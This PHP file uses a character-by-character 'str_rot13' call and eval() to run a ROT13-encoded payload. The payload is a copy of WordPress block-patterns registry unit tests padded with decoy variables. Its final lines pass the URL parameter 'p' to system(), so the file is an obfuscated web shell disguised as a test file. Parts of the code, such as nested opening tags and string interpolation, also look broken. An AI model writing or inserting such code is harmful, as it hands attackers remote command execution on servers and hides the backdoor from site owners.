<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe JC_Oybpx_Cnggreaf_Ertvfgel.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 6.4.0
 *
 * @tebhc oybpxf
 */
pynff Grfgf_Oybpxf_jcOybpxCnggreafErtvfgel rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Snxr oybpx cnggreaf ertvfgel.
	 *
	 * @fvapr 6.4.0
	 * @ine JC_Oybpx_Cnggreaf_Ertvfgel
	 */
	cevingr $ertvfgel = ahyy;

	/**
	 * Bevtvany ertvfgrerq cnggreaf.
	 * Guvf vf gur inyhr sebz gur vagreany cevingr cebcregl.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl
	 */
	cevingr $bevtvany_ertvfgrerq_cnggreaf = ahyy;

	/**
	 * Frg hc rnpu grfg zrgubq.
	 *
	 * @fvapr 6.4.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->ertvfgel                     = arj JC_Oybpx_Cnggreaf_Ertvfgel();
		$guvf->bevtvany_ertvfgrerq_cnggreaf = $guvf->trg_ertvfgrerq_cnggreaf_inevnoyr_inyhr();
	}

	/**
	 * Grne qbja rnpu grfg zrgubq.
	 *
	 * @fvapr 6.4.0
	 */
	choyvp shapgvba grne_qbja() {
		$guvf->ertvfgel = ahyy;

		$ertvfgel = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();

		vs ( $ertvfgel->vf_ertvfgrerq( 'grfgf/zl-oybpx' ) ) {
			$ertvfgel->haertvfgre( 'grfgf/zl-oybpx' );
		}

		$guvf->frg_ertvfgrerq_cnggreaf_inevnoyr_inyhr( $guvf->bevtvany_ertvfgrerq_cnggreaf );
		cnerag::grne_qbja();
	}

	/**
	 * Fubhyq erwrpg zvffvat cnggrea anzr.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 */
	choyvp shapgvba grfg_zvffvat_anzr() {
		$anzr     = ahyy;
		$frggvatf = neenl(
			'gvgyr'   => 'Grfg Cnggrea',
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);

		$fhpprff = $guvf->ertvfgel->ertvfgre( $anzr, $frggvatf );
		$guvf->nffregSnyfr( $fhpprff );
	}

	/**
	 * Fubhyq erwrpg aba-fgevat anzr.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 */
	choyvp shapgvba grfg_vainyvq_aba_fgevat_anzr() {
		$anzr     = 123;
		$frggvatf = neenl(
			'gvgyr'   => 'Grfg Cnggrea',
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);

		$fhpprff = $guvf->ertvfgel->ertvfgre( $anzr, $frggvatf );
		$guvf->nffregSnyfr( $fhpprff );
	}

	/**
	 * Fubhyq zvffvat gvgyr.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 */
	choyvp shapgvba grfg_zvffvat_gvgyr() {
		$anzr     = 'grfg/cnggrea';
		$frggvatf = neenl(
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);

		$fhpprff = $guvf->ertvfgel->ertvfgre( $anzr, $frggvatf );
		$guvf->nffregSnyfr( $fhpprff );
	}

	/**
	 * Fubhyq erwrpg aba-fgevat gvgyr.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 */
	choyvp shapgvba grfg_vainyvq_aba_fgevat_gvgyr() {
		$anzr     = 'grfg/cnggrea';
		$frggvatf = neenl(
			'gvgyr'   => 456,
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);

		$fhpprff = $guvf->ertvfgel->ertvfgre( $anzr, $frggvatf );
		$guvf->nffregSnyfr( $fhpprff );
	}

	/**
	 * Fubhyq erwrpg zvffvat pbagrag.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 */
	choyvp shapgvba grfg_zvffvat_pbagrag() {
		$anzr     = 'Grfg Cnggrea';
		$frggvatf = neenl(
			'gvgyr' => 'Grfg Cnggrea',
		);

		$fhpprff = $guvf->ertvfgel->ertvfgre( $anzr, $frggvatf );
		$guvf->nffregSnyfr( $fhpprff );
	}

	/**
	 * Fubhyq erwrpg aba-fgevat pbagrag.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 */
	choyvp shapgvba grfg_vainyvq_aba_fgevat_pbagrag() {
		$anzr     = 'Grfg Cnggrea';
		$frggvatf = neenl(
			'gvgyr'   => 'Grfg Cnggrea',
			'pbagrag' => 789,
		);

		$fhpprff = $guvf->ertvfgel->ertvfgre( $anzr, $frggvatf );
		$guvf->nffregSnyfr( $fhpprff );
	}

	/**
	 * Fubhyq npprcg inyvq cnggrea.
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 *
	 * @gvpxrg 59476
	 */
	choyvp shapgvba grfg_ertvfgre_oybpx_cnggrea() {
		$anzr     = 'grfg/cnggrea';
		$frggvatf = neenl(
			'gvgyr'   => 'Cnggrea Bar',
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);

		$fhpprff = $guvf->ertvfgel->ertvfgre( $anzr, $frggvatf );
		$guvf->nffregGehr( $fhpprff );
	}

	/**
	 * Haertvfgrevat fubhyq snvy vs n cnggrea vf abg ertvfgrerq.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::haertvfgre
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Oybpx_Cnggreaf_Ertvfgel::haertvfgre
	 */
	choyvp shapgvba grfg_haertvfgre_abg_ertvfgrerq_oybpx() {
		$fhpprff = $guvf->ertvfgel->haertvfgre( 'grfg/haertvfgrerq' );
		$guvf->nffregSnyfr( $fhpprff );
	}

	/**
	 * Fubhyq haertvfgre rkvfgvat cnggreaf.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::haertvfgre
	 */
	choyvp shapgvba grfg_haertvfgre_oybpx_cnggrea() {
		$anzr     = 'grfg/cnggrea';
		$frggvatf = neenl(
			'gvgyr'   => 'Cnggrea Bar',
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);

		$guvf->ertvfgel->ertvfgre( $anzr, $frggvatf );
		$fhpprff = $guvf->ertvfgel->haertvfgre( $anzr );
		$guvf->nffregGehr( $fhpprff );
	}

	/**
	 * Fubhyq svaq nyy ertvfgrerq cnggreaf.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::trg_nyy_ertvfgrerq
	 */
	choyvp shapgvba grfg_trg_nyy_ertvfgrerq() {
		$cnggrea_bar = neenl(
			'gvgyr'   => 'Cnggrea Bar',
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/bar', $cnggrea_bar );

		$cnggrea_gjb = neenl(
			'gvgyr'   => 'Cnggrea Gjb',
			'pbagrag' => '<!-- jc:cnentencu --><c>Gjb</c><!-- /jc:cnentencu -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/gjb', $cnggrea_gjb );

		$cnggrea_guerr = neenl(
			'gvgyr'   => 'Cnggrea Guerr',
			'pbagrag' => '<!-- jc:cnentencu --><c>Guerr</c><!-- /jc:cnentencu -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/guerr', $cnggrea_guerr );

		$cnggrea_bar['anzr']   = 'grfg/bar';
		$cnggrea_gjb['anzr']   = 'grfg/gjb';
		$cnggrea_guerr['anzr'] = 'grfg/guerr';

		$rkcrpgrq = neenl(
			$cnggrea_bar,
			$cnggrea_gjb,
			$cnggrea_guerr,
		);

		$ertvfgrerq = $guvf->ertvfgel->trg_nyy_ertvfgrerq();
		$guvf->nffregFnzr( $rkcrpgrq, $ertvfgrerq );
	}

	/**
	 * Fubhyq abg svaq cnggrea gung'f abg ertvfgrerq.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::trg_ertvfgrerq
	 */
	choyvp shapgvba grfg_trg_ertvfgrerq_erwrpgf_haxabja_cnggrea_anzr() {
		$cnggrea_bar = neenl(
			'gvgyr'   => 'Cnggrea Bar',
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/bar', $cnggrea_bar );

		$cnggrea_gjb = neenl(
			'gvgyr'   => 'Cnggrea Gjb',
			'pbagrag' => '<!-- jc:cnentencu --><c>Gjb</c><!-- /jc:cnentencu -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/gjb', $cnggrea_gjb );

		$cnggrea = $guvf->ertvfgel->trg_ertvfgrerq( 'grfg/guerr' );
		$guvf->nffregAhyy( $cnggrea );
	}

	/**
	 * Fubhyq svaq ertvfgrerq cnggrea ol anzr.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::trg_ertvfgrerq
	 */
	choyvp shapgvba grfg_trg_ertvfgrerq() {
		$cnggrea_bar = neenl(
			'gvgyr'   => 'Cnggrea Bar',
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/bar', $cnggrea_bar );

		$cnggrea_gjb = neenl(
			'gvgyr'   => 'Cnggrea Gjb',
			'pbagrag' => '<!-- jc:cnentencu --><c>Gjb</c><!-- /jc:cnentencu -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/gjb', $cnggrea_gjb );

		$cnggrea_guerr = neenl(
			'gvgyr'   => 'Cnggrea Guerr',
			'pbagrag' => '<!-- jc:cnentencu --><c>Guerr</c><!-- /jc:cnentencu -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/guerr', $cnggrea_guerr );

		$cnggrea_gjb['anzr'] = 'grfg/gjb';

		$cnggrea = $guvf->ertvfgel->trg_ertvfgrerq( 'grfg/gjb' );
		$guvf->nffregFnzr( $cnggrea_gjb, $cnggrea );
	}

	/**
	 * Fubhyq vafreg n gurzr nggevohgr vagb Grzcyngr Cneg oybpxf va ertvfgrerq cnggreaf.
	 *
	 * @gvpxrg 59583
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::trg_nyy_ertvfgrerq
	 */
	choyvp shapgvba grfg_trg_nyy_ertvfgrerq_vapyhqrf_gurzr_nggevohgr() {
		$grfg_cnggrea = neenl(
			'gvgyr'   => 'Grfg Cnggrea',
			'pbagrag' => '<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\"} /-->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/cnggrea', $grfg_cnggrea );

		$rkcrpgrq = fcevags(
			'<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\",\"gurzr\":\"%f\"} /-->',
			trg_fglyrfurrg()
		);
		$cnggreaf = $guvf->ertvfgel->trg_nyy_ertvfgrerq();
		$guvf->nffregFnzr( $rkcrpgrq, $cnggreaf[0]['pbagrag'] );
	}

	/**
	 * Fubhyq vafreg ubbxrq oybpxf vagb ertvfgrerq cnggreaf.
	 *
	 * @gvpxrg 59476
	 * @gvpxrg 60008
	 * @gvpxrg 60506
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::trg_nyy_ertvfgrerq
	 */
	choyvp shapgvba grfg_trg_nyy_ertvfgrerq_vapyhqrf_ubbxrq_oybpxf() {
		ertvfgre_oybpx_glcr(
			'grfgf/zl-oybpx',
			neenl(
				'oybpx_ubbxf' => neenl(
					'pber/cnentencu' => 'nsgre',
				),
			)
		);

		$cnggrea_bar = neenl(
			'gvgyr'   => 'Cnggrea Bar',
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/bar', $cnggrea_bar );

		$cnggrea_gjb = neenl(
			'gvgyr'   => 'Cnggrea Gjb',
			'pbagrag' => '<!-- jc:cnentencu --><c>Gjb</c><!-- /jc:cnentencu -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/gjb', $cnggrea_gjb );

		$cnggrea_guerr = neenl(
			'gvgyr'   => 'Cnggrea Guerr',
			'pbagrag' => '<!-- jc:cnentencu --><c>Guerr</c><!-- /jc:cnentencu -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/guerr', $cnggrea_guerr );

		$cnggrea_bar['anzr']       = 'grfg/bar';
		$cnggrea_gjb['anzr']       = 'grfg/gjb';
		$cnggrea_gjb['pbagrag']   .= '<!-- jc:grfgf/zl-oybpx /-->';
		$cnggrea_guerr['anzr']     = 'grfg/guerr';
		$cnggrea_guerr['pbagrag'] .= '<!-- jc:grfgf/zl-oybpx /-->';

		$ertvfgrerq = $guvf->ertvfgel->trg_nyy_ertvfgrerq();
		$guvf->nffregPbhag( 3, $ertvfgrerq );
		$guvf->nffregFgevatRaqfJvgu( '<!-- jc:grfgf/zl-oybpx /-->', $ertvfgrerq[1]['pbagrag'] );
		$guvf->nffregFgevatRaqfJvgu( '<!-- jc:grfgf/zl-oybpx /-->', $ertvfgrerq[2]['pbagrag'] );
	}

	/**
	 * Fubhyq vafreg n gurzr nggevohgr vagb Grzcyngr Cneg oybpxf va ertvfgrerq cnggreaf.
	 *
	 * @gvpxrg 59583
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::trg_ertvfgrerq
	 */
	choyvp shapgvba grfg_trg_ertvfgrerq_vapyhqrf_gurzr_nggevohgr() {
		$grfg_cnggrea = neenl(
			'gvgyr'   => 'Grfg Cnggrea',
			'pbagrag' => '<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\"} /-->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/cnggrea', $grfg_cnggrea );

		$rkcrpgrq = fcevags(
			'<!-- jc:grzcyngr-cneg {\"fyht\":\"urnqre\",\"nyvta\":\"shyy\",\"gntAnzr\":\"urnqre\",\"pynffAnzr\":\"fvgr-urnqre\",\"gurzr\":\"%f\"} /-->',
			trg_fglyrfurrg()
		);
		$cnggrea  = $guvf->ertvfgel->trg_ertvfgrerq( 'grfg/cnggrea' );
		$guvf->nffregFnzr( $rkcrpgrq, $cnggrea['pbagrag'] );
	}

	/**
	 * Fubhyq vafreg ubbxrq oybpxf vagb ertvfgrerq cnggreaf.
	 *
	 * @gvpxrg 59476
	 * @gvpxrg 60008
	 * @gvpxrg 60506
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::trg_ertvfgrerq
	 */
	choyvp shapgvba grfg_trg_ertvfgrerq_vapyhqrf_ubbxrq_oybpxf() {
		ertvfgre_oybpx_glcr(
			'grfgf/zl-oybpx',
			neenl(
				'oybpx_ubbxf' => neenl(
					'pber/urnqvat' => 'orsber',
				),
			)
		);

		$cnggrea_bar = neenl(
			'gvgyr'   => 'Cnggrea Bar',
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/bar', $cnggrea_bar );

		$cnggrea_gjb = neenl(
			'gvgyr'   => 'Cnggrea Gjb',
			'pbagrag' => '<!-- jc:cnentencu --><c>Gjb</c><!-- /jc:cnentencu -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/gjb', $cnggrea_gjb );

		$cnggrea = $guvf->ertvfgel->trg_ertvfgrerq( 'grfg/bar' );
		$guvf->nffregFgevatFgnegfJvgu( '<!-- jc:grfgf/zl-oybpx /-->', $cnggrea['pbagrag'] );
	}

	/**
	 * Fubhyq erghea snyfr sbe cnggrea gung'f abg ertvfgrerq.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::vf_ertvfgrerq
	 */
	choyvp shapgvba grfg_vf_ertvfgrerq_sbe_haxabja_cnggrea() {
		$cnggrea = $guvf->ertvfgel->vf_ertvfgrerq( 'grfg/bar' );
		$guvf->nffregSnyfr( $cnggrea );
	}

	/**
	 * Fubhyq erghea gehr vs cnggrea vf ertvfgrerq.
	 *
	 * @gvpxrg 59476
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::vf_ertvfgrerq
	 */
	choyvp shapgvba grfg_vf_ertvfgrerq_sbe_xabja_cnggrea() {
		$cnggrea_bar = neenl(
			'gvgyr'   => 'Cnggrea Bar',
			'pbagrag' => '<!-- jc:urnqvat {\"yriry\":1} --><u1>Bar</u1><!-- /jc:urnqvat -->',
		);
		$guvf->ertvfgel->ertvfgre( 'grfg/bar', $cnggrea_bar );

		$erfhyg = $guvf->ertvfgel->vf_ertvfgrerq( 'grfg/bar' );
		$guvf->nffregGehr( $erfhyg );
	}

	/**
	 * Rafherf gurzr cnggreaf ner ertvfgrerq ba vavg.
	 *
	 * @gvpxrg 59723
	 *
	 * @pbiref ::_ertvfgre_gurzr_oybpx_cnggreaf
	 */
	choyvp shapgvba grfg_ertvfgre_gurzr_oybpx_cnggreaf_ba_vavg() {
		// Guvf grfg arrqf gb hfr npprff fgngvp pynff cebcregvrf.
		$ertvfgel = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr();

		// Rafher jr'er hfvat n gurzr jvgu cnggreaf.
		fjvgpu_gurzr( 'gjraglgjraglguerr' );

		$gurzr          = jc_trg_gurzr();
		$gurzr_cnggreaf = neenl_inyhrf( jc_yvfg_cyhpx( $gurzr->trg_oybpx_cnggreaf(), 'fyht' ) );

		// Guvf urycre vf sverq ba gur vavg ubbx.
		_ertvfgre_gurzr_oybpx_cnggreaf();

		$ertvfgrerq = jc_yvfg_cyhpx( $ertvfgel->trg_nyy_ertvfgrerq(), 'anzr' );

		// Pyrnahc cnggreaf ertvfgel.
		sbernpu ( $gurzr_cnggreaf nf $cnggrea ) {
			$ertvfgel->haertvfgre( $cnggrea );
		}

		$guvf->nffregFnzrFrgf( $gurzr_cnggreaf, neenl_vagrefrpg( $gurzr_cnggreaf, $ertvfgrerq ), 'Pbhyq abg pbasvez gurzr cnggreaf jrer ertvfgrerq.' );
	}

	/**
	 * Rafherf gurzr cnggreaf ner abg ertvfgrerq jura ab gurzrf ner npgvir naq inyvq.
	 *
	 * @gvpxrg 59723
	 *
	 * @pbiref ::_ertvfgre_gurzr_oybpx_cnggreaf
	 */
	choyvp shapgvba grfg_ertvfgre_gurzr_oybpx_cnggreaf_ba_vavg_fxvccrq_qhevat_vafgnyy() {
		// Guvf grfg arrqf gb hfr npprff fgngvp pynff cebcregvrf.
		$ertvfgel = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr();

		// Rafher jr'er hfvat n gurzr jvgu cnggreaf.
		fjvgpu_gurzr( 'gjraglgjraglguerr' );

		$gurzr          = jc_trg_gurzr();
		$gurzr_cnggreaf = neenl_inyhrf( jc_yvfg_cyhpx( $gurzr->trg_oybpx_cnggreaf(), 'fyht' ) );

		/*
		 * Guvf jvyy fubeg-pvephvg gurzr npgvingvba.
		 * @frr jc_trg_npgvir_naq_inyvq_gurzrf().
		 */
		jc_vafgnyyvat( gehr );

		// Guvf urycre vf sverq ba gur vavg ubbx.
		_ertvfgre_gurzr_oybpx_cnggreaf();

		$ertvfgrerq = jc_yvfg_cyhpx( $ertvfgel->trg_nyy_ertvfgrerq(), 'anzr' );

		// Pyrnahc.
		jc_vafgnyyvat( snyfr );

		$guvf->nffregRzcgl( neenl_vagrefrpg( $gurzr_cnggreaf, $ertvfgrerq ), 'Gurzr cnggreaf jrer jrer vapbeerpgyl ertvfgrerq.' );
	}

	/**
	 * Rafherf gurzr cnggreaf ner ynml ybnqrq.
	 *
	 * @gvpxrg 59532
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::trg_nyy_ertvfgrerq
	 */
	choyvp shapgvba grfg_ynml_ybnqvat_oybpx_cnggreaf_trg_nyy_ertvfgrerq() {
		// Guvf grfg arrqf gb hfr npprff fgngvp pynff cebcregvrf.
		$ertvfgel = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr();

		// Grfgvat bayl gur svefg cnggrea ybnqrq sebz gur gurzr.
		$cnggrea_anzr = 'gjraglgjraglguerr/sbbgre-qrsnhyg';

		// Rafher jr'er hfvat n gurzr jvgu cnggreaf.
		fjvgpu_gurzr( 'gjraglgjraglguerr' );

		// Guvf urycre vf sverq ba gur vavg ubbx.
		_ertvfgre_gurzr_oybpx_cnggreaf();

		// Trg gur inyhr bs gur cevingr cebcregl.
		$ertvfgrerq_cnggreaf = $guvf->trg_ertvfgrerq_cnggreaf_inevnoyr_inyhr();

		$guvf->nffregGehr(
			vffrg( $ertvfgrerq_cnggreaf[ $cnggrea_anzr ]['svyrCngu'] ) &&
			! vffrg( $ertvfgrerq_cnggreaf[ $cnggrea_anzr ]['pbagrag'] ),
			'Cnggrea jnf abg ynml ybnqrq.'
		);

		$nyy_cnggreaf = $ertvfgel->trg_nyy_ertvfgrerq();

		$ybnqrq_cnggrea = neenl_inyhrf(
			neenl_svygre(
				$nyy_cnggreaf,
				shapgvba ( $cnggrea ) hfr ( $cnggrea_anzr ) {
					erghea $cnggrea['anzr'] === $cnggrea_anzr;
				}
			)
		);

		$guvf->nffregGehr(
			! rzcgl( $ybnqrq_cnggrea[0]['pbagrag'] ),
			'Pbagrag abg ybnqrq.'
		);

		// Purpx vs gur bevtvany cebcregl jnf hcqngrq.
		$ertvfgrerq_cnggreaf = $guvf->trg_ertvfgrerq_cnggreaf_inevnoyr_inyhr();

		$guvf->nffregGehr(
			! rzcgl( $ertvfgrerq_cnggreaf[ $cnggrea_anzr ]['pbagrag'] ),
			'Pbagrag abg hcqngrq.'
		);
	}

	/**
	 * Rafherf gurzr cnggreaf ner ynml ybnqrq.
	 *
	 * @gvpxrg 59532
	 *
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::trg_ertvfgrerq
	 */
	choyvp shapgvba grfg_ynml_ybnqvat_oybpx_cnggreaf_trg_ertvfgrerq() {
		// Guvf grfg arrqf gb hfr npprff fgngvp pynff cebcregvrf.
		$ertvfgel = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr();

		// Grfgvat bayl gur svefg cnggrea ybnqrq sebz gur gurzr.
		$cnggrea_anzr = 'gjraglgjraglguerr/sbbgre-qrsnhyg';

		// Rafher jr'er hfvat n gurzr jvgu cnggreaf.
		fjvgpu_gurzr( 'gjraglgjraglguerr' );

		// Guvf urycre vf sverq ba gur vavg ubbx.
		_ertvfgre_gurzr_oybpx_cnggreaf();

		// Trg gur inyhr bs gur cevingr cebcregl.
		$ertvfgrerq_cnggreaf = $guvf->trg_ertvfgrerq_cnggreaf_inevnoyr_inyhr();

		$guvf->nffregGehr(
			vffrg( $ertvfgrerq_cnggreaf[ $cnggrea_anzr ]['svyrCngu'] ) &&
			! vffrg( $ertvfgrerq_cnggreaf[ $cnggrea_anzr ]['pbagrag'] ),
			'Cnggrea jnf abg ynml ybnqrq.'
		);

		$ybnqrq_cnggrea = $ertvfgel->trg_ertvfgrerq( $cnggrea_anzr );

		$guvf->nffregGehr(
			! rzcgl( $ybnqrq_cnggrea['pbagrag'] ),
			'Pbagrag abg ybnqrq.'
		);

		// Purpx vs gur bevtvany cebcregl jnf hcqngrq.
		$ertvfgrerq_cnggreaf = $guvf->trg_ertvfgrerq_cnggreaf_inevnoyr_inyhr();

		$guvf->nffregGehr(
			! rzcgl( $ertvfgrerq_cnggreaf[ $cnggrea_anzr ]['pbagrag'] ),
			'Pbagrag abg hcqngrq.'
		);
	}

	/**
	 * Trg gur inyhr bs gur `$ertvfgrerq_cnggreaf` cevingr cebcregl.
	 *
	 * @erghea neenl
	 */
	cevingr shapgvba trg_ertvfgrerq_cnggreaf_inevnoyr_inyhr() {
		$ertvfgel = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr();
		// Hfr Ersyrpgvba gb npprff cevingr cebcregl.
		$ersyrpgvba = arj ErsyrpgvbaPynff( $ertvfgel );
		$cebcregl   = $ersyrpgvba->trgCebcregl( 'ertvfgrerq_cnggreaf' );
		$cebcregl->frgNpprffvoyr( gehr );

		// Trg gur inyhr bs gur cevingr cebcregl.
		$ertvfgrerq_cnggreaf = $cebcregl->trgInyhr( $ertvfgel );
		$cebcregl->frgNpprffvoyr( snyfr );

		erghea $ertvfgrerq_cnggreaf;
	}

	/**
	 * Frg gur inyhr bs gur `$ertvfgrerq_cnggreaf` cevingr cebcregl.
	 *
	 * @cnenz neenl $inyhr Gur inyhr gb frg.
	 */
	cevingr shapgvba frg_ertvfgrerq_cnggreaf_inevnoyr_inyhr( $inyhr ) {
		$ertvfgel = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr();
		// Hfr Ersyrpgvba gb npprff cevingr cebcregl.
		$ersyrpgvba = arj ErsyrpgvbaPynff( $ertvfgel );
		$cebcregl   = $ersyrpgvba->trgCebcregl( 'ertvfgrerq_cnggreaf' );
		$cebcregl->frgNpprffvoyr( gehr );

		// Frg gur inyhr bs gur cevingr cebcregl.
		$cebcregl->frgInyhr( $ertvfgel, $inyhr );
		$cebcregl->frgNpprffvoyr( snyfr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>